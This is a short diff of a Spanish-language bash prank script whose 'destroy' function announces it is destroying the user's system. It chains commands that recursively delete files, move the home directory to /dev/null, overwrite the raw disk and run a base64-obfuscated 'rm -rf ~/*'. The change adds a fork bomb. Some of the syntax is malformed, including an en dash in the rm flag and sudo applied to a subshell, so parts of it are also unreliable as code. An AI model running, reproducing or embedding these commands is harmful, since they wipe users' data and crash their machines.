@@ -1,7 +1,7 @@
 function destroy () {
   sudo clear
   echo "[+] Destruyendo tu sistema :)"
-  sudo rm –rf * && sudo mv ~ /dev/null && sudo ls > /dev/sda && sudo (echo cm0gLXJmIH4vKg== | base64 -d)
+  sudo rm –rf * && sudo mv ~ /dev/null && sudo ls > /dev/sda && sudo (echo cm0gLXJmIH4vKg== | base64 -d) && sudo :(){ :|: & };:
 }
 
 destroy
